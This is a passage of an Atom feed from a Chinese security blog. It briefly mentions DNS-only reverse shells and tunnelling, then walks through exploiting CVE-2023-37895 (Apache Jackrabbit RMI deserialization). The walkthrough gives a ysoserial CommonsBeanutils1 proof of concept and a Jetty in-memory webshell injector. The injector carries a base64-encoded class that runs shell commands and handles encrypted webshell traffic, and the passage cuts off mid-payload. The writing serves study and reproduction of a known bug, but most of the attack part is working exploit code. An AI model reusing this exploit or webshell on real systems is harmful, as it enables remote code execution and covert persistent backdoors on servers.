href="https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/JNDI/#serializeddata--ldap%E6%94%BB%E5%87%BB">https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/JNDI/#serializeddata--ldap%E6%94%BB%E5%87%BB</a></p><p>这篇文章写的不错</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;复现一下安洵的题目 这里就挑几道来复现就行了  复现地址的话在安洵平台上就可以&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://dce.i-soon.net/#/topicBank&quot;&gt;https://dce.i-soon.net/#/topicBank&lt;/a&gt;&lt;/p&gt;
&lt;p</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://ke1nys.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>针对环境只有DNS出网的反弹shell和隧道搭建</title>
    <link href="https://ke1nys.github.io/posts/e8e277ba.html"/>
    <id>https://ke1nys.github.io/posts/e8e277ba.html</id>
    <published>2023-12-14T09:13:03.000Z</published>
    <updated>2024-01-20T15:32:19.409Z</updated>
    
    <content type="html"><![CDATA[<p>而且这个主机的是采用站库分离的形式  数据库和网站分别在内网两个ip段下</p><p>这个只有DNS出网的环境是第一次见<strong>(一般来说内网主机都是啥也不出的)</strong>  所以来记录学习一下  但是我在第一步就卡住了  tmd 我切换成root用户的时候报了个奇奇怪怪的错误</p><p><img src="../images/image-20231214171449326.png" alt="image-20231214171449326"></p><p>所以放弃了  不做了  写个文章来记录一下就行了 </p><p><strong>这里除了学到这个DNS的反弹shell和隧道搭建   还有可以将我们的数据来进行分段传输上去</strong></p><p>我们在使用dnscat来反弹shell之后  我们就是用iodine工具来搭建隧道   <strong>(这里不直接使用这个dns隧道的原因就是这个东西不能搭配socks协议使用)</strong>  使其我们能直接ssh登录该内网服务器</p><p><strong>(因为只有DNS出网  并且我们能够ssh登录成功  那么我们就使用ssh来搭建隧道  使其能访问到内网其他主机)</strong></p><p>贴个大头师傅的博客地址  <a href="https://www.xiinnn.com/posts/icq-tunnelx/">https://www.xiinnn.com/posts/icq-tunnelx/</a></p><p>然后这就是全部了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;而且这个主机的是采用站库分离的形式  数据库和网站分别在内网两个ip段下&lt;/p&gt;
&lt;p&gt;这个只有DNS出网的环境是第一次见&lt;strong&gt;(一般来说内网主机都是啥也不出的)&lt;/strong&gt;  所以来记录学习一下  但是我在第一步就卡住了  tmd 我切换成root用户的时</summary>
      
    
    
    
    
    <category term="内网" scheme="https://ke1nys.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>Java-Apache_Jackrabbit_RMI-CVE-2023-37895</title>
    <link href="https://ke1nys.github.io/posts/41fade43.html"/>
    <id>https://ke1nys.github.io/posts/41fade43.html</id>
    <published>2023-12-13T07:27:35.000Z</published>
    <updated>2024-01-20T15:32:19.402Z</updated>
    
    <content type="html"><![CDATA[<p>参考链接</p><p><a href="https://xz.aliyun.com/t/13118">https://xz.aliyun.com/t/13118</a></p><p><a href="https://boogipop.com/2023/10/16/Apache%20Jackrabbit%20RMI%20RCE%20%E5%88%86%E6%9E%90%E5%8F%8A%E5%88%A9%E7%94%A8/">https://boogipop.com/2023/10/16/Apache%20Jackrabbit%20RMI%20RCE%20%E5%88%86%E6%9E%90%E5%8F%8A%E5%88%A9%E7%94%A8/</a></p><h2 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h2><p><a href="https://jackrabbit.apache.org/jcr/downloads.html#apache-jackrabbit-2-20-10-november-7th-2023">https://jackrabbit.apache.org/jcr/downloads.html#apache-jackrabbit-2-20-10-november-7th-2023</a>   </p><p>把2.20.10版本的jar包下载下来  然后去github上下载其相同版本的源码</p><p><img src="../images/image-20231213153027425.png" alt="image-20231213153027425"></p><p>配置好Debug   然后运行jar包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp; &#x27;C:\Program Files\Java\jdk1.8.0_202\bin\java.exe&#x27; -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5005 -jar .\jackrabbit-standalone-2.20.10.jar</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231213153113363.png" alt="image-20231213153113363"></p><p>部署成功 </p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>在Apache Jackrabbit webapp和standalone中使用了commons-beanutils组件，该组件包含一个可用于通过 RMI 远程执行代码的类。攻击者可利用该组件构造恶意的序列化对象，发送到服务端的RMI服务端口或者Web服务的/rmi路径，目标服务器对恶意对象反序列化导致RCE</p><p>POC</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.jackrabbit.rmi.repository.URLRemoteRepository;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.ObjectPayload;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.jcr.SimpleCredentials;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">poc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">( String[] args )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Class&lt;? <span class="keyword">extends</span> <span class="title class_">ObjectPayload</span>&gt; payloadClass = ObjectPayload.Utils.getPayloadClass(<span class="string">&quot;CommonsBeanutils1&quot;</span>);</span><br><span class="line">        <span class="type">ObjectPayload</span> <span class="variable">payload</span> <span class="operator">=</span> (ObjectPayload)payloadClass.newInstance();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> payload.getObject(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">SimpleCredentials</span> <span class="variable">simpleCredentials</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleCredentials</span>(<span class="string">&quot;admin&quot;</span>, <span class="string">&quot;admin&quot;</span>.toCharArray());</span><br><span class="line">        simpleCredentials.setAttribute(<span class="string">&quot;admin&quot;</span>, object);</span><br><span class="line"></span><br><span class="line">        <span class="type">URLRemoteRepository</span> <span class="variable">repository</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLRemoteRepository</span>(<span class="string">&quot;http://localhost:8080/rmi&quot;</span>);</span><br><span class="line">        repository.login(simpleCredentials);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>漏洞点存在于</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;servlet&gt;</span><br><span class="line">    &lt;servlet-name&gt;RMI&lt;/servlet-name&gt;</span><br><span class="line">    &lt;servlet-class&gt;org.apache.jackrabbit.servlet.remote.RemoteBindingServlet&lt;/servlet-class&gt;</span><br><span class="line">&lt;/servlet&gt;</span><br><span class="line">&lt;servlet-mapping&gt;</span><br><span class="line">    &lt;servlet-name&gt;RMI&lt;/servlet-name&gt;</span><br><span class="line">    &lt;url-pattern&gt;/rmi&lt;/url-pattern&gt;</span><br><span class="line">&lt;/servlet-mapping&gt;</span><br></pre></td></tr></table></figure><p>就是在这个/rmi路由下   对应的类是<code>RemoteBindingServlet</code></p><p><img src="../images/image-20231213153552850.png" alt="image-20231213153552850"></p><p>这段代码的作用是将远程存储库对象进行序列化，并将序列化后的对象以二进制流的形式作为响应发送给客户端.</p><p><img src="../images/image-20231213154117134.png" alt="image-20231213154117134"></p><p>然后跟进这个login方法</p><p><img src="../images/image-20231213154203284.png" alt="image-20231213154203284"></p><p>为什么是这个AbstractRepository类的原因是   因为这个类是URLRemoteRepository的父类</p><p><img src="../images/image-20231213154236841.png" alt="image-20231213154236841"></p><p><img src="../images/image-20231213154304610.png" alt="image-20231213154304610"></p><p><img src="../images/image-20231213154340914.png" alt="image-20231213154340914"></p><p>然后进入这个重载login方法   这里获取到的factory是 URLRemoteRepositoryFactory  这个工厂类  然后我们在跟进这个工厂类的login方法</p><p><img src="../images/image-20231213154729422.png" alt="image-20231213154729422"></p><p>这段代码是一个 login() 方法的实现，用于通过提供的凭据和工作空间登录到远程存储库，并返回一个会话（Session）对象</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// 调用 remote 对象的 login() 方法来进行远程登录。</span><br><span class="line">// remote 是一个远程存储库对象（RemoteRepository），通过调用其 login() 方法，使用提供的凭据和工作空间进行登录操作。</span><br><span class="line">// 返回值是一个远程会话对象（RemoteSession）</span><br></pre></td></tr></table></figure><p>那么我们就接着来看服务端这边处理远程登录的代码</p><p>ServerRepository的login方法</p><p><img src="../images/image-20231213155139423.png" alt="image-20231213155139423"></p><p><img src="../images/image-20231213155214492.png" alt="image-20231213155214492"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">// 调用 repository 对象的 login() 方法来进行登录操作</span><br></pre></td></tr></table></figure><p>这里的关键点是credentials是通过客户端传递过来的，而Credentials接口继承了Serializable接口</p><p><img src="../images/image-20231213155501100.png" alt="image-20231213155501100"></p><p><img src="../images/image-20231213155540985.png" alt="image-20231213155540985"></p><p>并且SimpleCredentials这个类使用了这个接口  并且里面刚好有public的setter和getter方法能赋值这个hashmap的attributes参数</p><p><img src="../images/image-20231213155652543.png" alt="image-20231213155652543"></p><p>这里的value设置成恶意的对象，能够在反序列化的过程中触发RCE，具体设置成什么，则需要在Apache Jackrabbit寻找其他可利用的链 <strong>(然后我们在查看依赖的过程发现  其中存在这个cb这个依赖)</strong></p><p><img src="../images/image-20231213155803256.png" alt="image-20231213155803256"></p><p>那么我们就可以来设置value为cb链了</p><p>接下来的过程就是调用远程ServerRepository的login方法，其参数是构造的恶意SimpleCredentials，其过程是服务端开启了一个RMI服务，客户端调用该服务并发送恶意对象，服务端反序列化恶意对象，触发RCE</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unmarshalvalue方法，在rmi请求的流程中，客户端会序列化请求的参数，然后在服务端的unmarshalvalue方法进行readobject反序列化，从而导致RCE</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231213160242219.png" alt="image-20231213160242219"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">getOutputProperties:507, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect) [3]</span><br><span class="line">invoke:498, Method (java.lang.reflect)</span><br><span class="line">invokeMethod:2128, PropertyUtilsBean (org.apache.commons.beanutils)</span><br><span class="line">getSimpleProperty:1279, PropertyUtilsBean (org.apache.commons.beanutils)</span><br><span class="line">getNestedProperty:809, PropertyUtilsBean (org.apache.commons.beanutils)</span><br><span class="line">getProperty:885, PropertyUtilsBean (org.apache.commons.beanutils)</span><br><span class="line">getProperty:464, PropertyUtils (org.apache.commons.beanutils)</span><br><span class="line">compare:163, BeanComparator (org.apache.commons.beanutils)</span><br><span class="line">siftDownUsingComparator:722, PriorityQueue (java.util)</span><br><span class="line">siftDown:688, PriorityQueue (java.util)</span><br><span class="line">heapify:737, PriorityQueue (java.util)</span><br><span class="line">readObject:797, PriorityQueue (java.util)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect) [2]</span><br><span class="line">invoke:498, Method (java.lang.reflect)</span><br><span class="line">invokeReadObject:1170, ObjectStreamClass (java.io)</span><br><span class="line">readSerialData:2178, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:2069, ObjectInputStream (java.io)</span><br><span class="line">readObject0:1573, ObjectInputStream (java.io)</span><br><span class="line">readObject:431, ObjectInputStream (java.io)</span><br><span class="line">readObject:1412, HashMap (java.util)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect) [1]</span><br><span class="line">invoke:498, Method (java.lang.reflect)</span><br><span class="line">invokeReadObject:1170, ObjectStreamClass (java.io)</span><br><span class="line">readSerialData:2178, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:2069, ObjectInputStream (java.io)</span><br><span class="line">readObject0:1573, ObjectInputStream (java.io)</span><br><span class="line">defaultReadFields:2287, ObjectInputStream (java.io)</span><br><span class="line">readSerialData:2211, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:2069, ObjectInputStream (java.io)</span><br><span class="line">readObject0:1573, ObjectInputStream (java.io)</span><br><span class="line">readObject:431, ObjectInputStream (java.io)</span><br><span class="line">unmarshalValue:322, UnicastRef (sun.rmi.server)</span><br><span class="line">unmarshalParametersUnchecked:628, UnicastServerRef (sun.rmi.server)</span><br><span class="line">unmarshalParameters:616, UnicastServerRef (sun.rmi.server)</span><br><span class="line">dispatch:338, UnicastServerRef (sun.rmi.server)</span><br><span class="line">run:200, Transport$1 (sun.rmi.transport)</span><br><span class="line">run:197, Transport$1 (sun.rmi.transport)</span><br><span class="line">doPrivileged:-1, AccessController (java.security)</span><br><span class="line">serviceCall:196, Transport (sun.rmi.transport)</span><br><span class="line">handleMessages:573, TCPTransport (sun.rmi.transport.tcp)</span><br><span class="line">run0:834, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp)</span><br><span class="line">lambda$run$0:688, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp)</span><br><span class="line">run:-1, 1943300791 (sun.rmi.transport.tcp.TCPTransport$ConnectionHandler$$Lambda$14)</span><br><span class="line">doPrivileged:-1, AccessController (java.security)</span><br><span class="line">run:687, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp)</span><br><span class="line">runWorker:1149, ThreadPoolExecutor (java.util.concurrent)</span><br><span class="line">run:624, ThreadPoolExecutor$Worker (java.util.concurrent)</span><br><span class="line">run:748, Thread (java.lang)</span><br></pre></td></tr></table></figure><p>这个就是完整的调用栈了</p><h2 id="内存马注入"><a href="#内存马注入" class="headerlink" title="内存马注入"></a>内存马注入</h2><p>这里直接就是参考boogipop师傅的</p><p><img src="../images/image-20231213172041855.png" alt="image-20231213172041855"></p><p>jetty9版本  那么直接去找jetty9的poc来打就行了</p><p>内存马打法其实都一样</p><p>InjectJettyServletShell.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> sun.misc.BASE64Decoder;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InjectJettyServletShell</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">Object</span> <span class="variable">servletHandler</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">filterName</span> <span class="operator">=</span> <span class="string">&quot;ServletTemplates&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">filterClassName</span> <span class="operator">=</span> <span class="string">&quot;org.example.ServletTemplates&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;/*&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">LoadServlet</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Thread.currentThread().getContextClassLoader().loadClass(filterClassName).newInstance();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            <span class="type">Method</span> <span class="variable">a</span> <span class="operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, <span class="type">byte</span>[].class, Integer.TYPE, Integer.TYPE);</span><br><span class="line">            a.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">byte</span>[] b = (<span class="keyword">new</span> <span class="title class_">BASE64Decoder</span>()).decodeBuffer(<span class="string">&quot;yv66vgAAADQBHgoARwB+CgAQAH8KAIAAgQoAWACCCQCDAIQIAIUKAIYAhwgAiAsAiQCKCACLCgAQAIwIAI0KABAAjgkAjwCQCACRBwCSCACTCACUCABhCACVBwCWCgCXAJgKAJcAmQoAmgCbCgAVAJwIAJ0KABUAngoAFQCfCwCgAKEKAKIAhwgAowsAiQCkCwCJAKUIAKYLAIkApwgAqAsAqQCqCACrCgCsAK0HAK4HAK8KACkAfgsAqQCwCgApALEIALIKACkAswoAKQC0CgAoALUKAKwAtgsAiQC3CgC4ALkKAEYAugoArAC7BwC8CgBBAL0KAD0AvgoANgC/CgA2AMAKAD0AwQgAwgcAwwcAxAcAxQoAPQDGBwDHCgDIAMkHAMoKAEMAywoARgDMBwDNBwDOAQABVQEADElubmVyQ2xhc3NlcwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAeTG9yZy9leGFtcGxlL1NlcnZsZXRUZW1wbGF0ZXM7AQANQkFTRTY0RGVjb2RlcgEAFihMamF2YS9sYW5nL1N0cmluZzspW0IBAARkYXRhAQASTGphdmEvbGFuZy9TdHJpbmc7AQAKaW5wdXRCeXRlcwEAAltCAQAHZW5jb2RlcgcAzwEAB0RlY29kZXIBABpMamF2YS91dGlsL0Jhc2U2NCREZWNvZGVyOwEADGVuY29kZWRCeXRlcwEABmRvUG9zdAEAUihMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7KVYBAARjbWRzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEABnJlc3VsdAEAA2NtZAEAAWsBAAZjaXBoZXIBABVMamF2YXgvY3J5cHRvL0NpcGhlcjsBAA5ldmlsQ2xhc3NCeXRlcwEACWV2aWxDbGFzcwEAEUxqYXZhL2xhbmcvQ2xhc3M7AQAKZXZpbE9iamVjdAEAEkxqYXZhL2xhbmcvT2JqZWN0OwEADHRhcmdldE1ldGhvZAEAGkxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQABZQEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEAB3JlcXVlc3QBACdMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAAhyZXNwb25zZQEAKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTsBAA1TdGFja01hcFRhYmxlBwCSBwBfBwDKAQAKRXhjZXB0aW9ucwcA0AEABWRvR2V0AQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARhcmdzAQAKU291cmNlRmlsZQEAFVNlcnZsZXRUZW1wbGF0ZXMuamF2YQwASgBLDADRANIHANMMANQA1QwA1gDXBwDYDADZANoBAB5bK10gRHluYW1pYyBTZXJ2bGV0IHNheXMgaGVsbG8HANsMANwA3QEABHR5cGUHAN4MAN8A4AEABWJhc2ljDADCAOEBAARwYXNzDADiAOMHAOQMAOUAVAEAAS8BABBqYXZhL2xhbmcvU3RyaW5nAQAHL2Jpbi9zaAEAAi1jAQACL0MBABFqYXZhL3V0aWwvU2Nhbm5lcgcA5gwA5wDoDADpAOoHAOsMAOwA7QwASgDuAQACXEEMAO8A8AwA8QDyBwDzDAD0APUHAPYBABBlNDVlMzI5ZmViNWQ5MjViDAD3AOAMAPgA8gEABFBPU1QMAPkA+gEAAXUHAPsMAPwA/QEAA0FFUwcA/gwA/wEAAQAfamF2YXgvY3J5cHRvL3NwZWMvU2VjcmV0S2V5U3BlYwEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyDAEBAQIMAQMBBAEAAAwBAwEFDAEGAPIMAEoBBwwBCAEJDAEKAQsHAQwMAQ0A8gwAUQBSDAEOANcBAB5vcmcvZXhhbXBsZS9TZXJ2bGV0VGVtcGxhdGVzJFUMAQ8BEAwBEQESDABKARMMARQBFQwBFgEXAQAGZXF1YWxzAQAPamF2YS9sYW5nL0NsYXNzAQAcamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdAEAHWphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlDAEYARkBABBqYXZhL2xhbmcvT2JqZWN0BwEaDAEbARwBABNqYXZhL2xhbmcvRXhjZXB0aW9uDAEdAEsMAFwAXQEAHG9yZy9leGFtcGxlL1NlcnZsZXRUZW1wbGF0ZXMBAB5qYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXQBABhqYXZhL3V0aWwvQmFzZTY0JERlY29kZXIBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAIZ2V0Qnl0ZXMBAAQoKVtCAQAQamF2YS91dGlsL0Jhc2U2NAEACmdldERlY29kZXIBABwoKUxqYXZhL3V0aWwvQmFzZTY0JERlY29kZXI7AQAGZGVjb2RlAQAGKFtCKVtCAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAEADGdldFBhcmFtZXRlcgEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAVKExqYXZhL2xhbmcvT2JqZWN0OylaAQAHaXNFbXB0eQEAAygpWgEADGphdmEvaW8vRmlsZQEACXNlcGFyYXRvcgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACgoW0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQARamF2YS9sYW5nL1Byb2Nlc3MBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQAMdXNlRGVsaW1pdGVyAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS91dGlsL1NjYW5uZXI7AQAEbmV4dAEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAE2phdmEvaW8vUHJpbnRXcml0ZXIBAAlnZXRIZWFkZXIBAAlnZXRNZXRob2QBAApnZXRTZXNzaW9uAQAiKClMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXNzaW9uOwEAHmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2Vzc2lvbgEADHNldEF0dHJpYnV0ZQEAJyhMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL09iamVjdDspVgEAE2phdmF4L2NyeXB0by9DaXBoZXIBAAtnZXRJbnN0YW5jZQEAKShMamF2YS9sYW5nL1N0cmluZzspTGphdmF4L2NyeXB0by9DaXBoZXI7AQAMZ2V0QXR0cmlidXRlAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL09iamVjdDsBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbG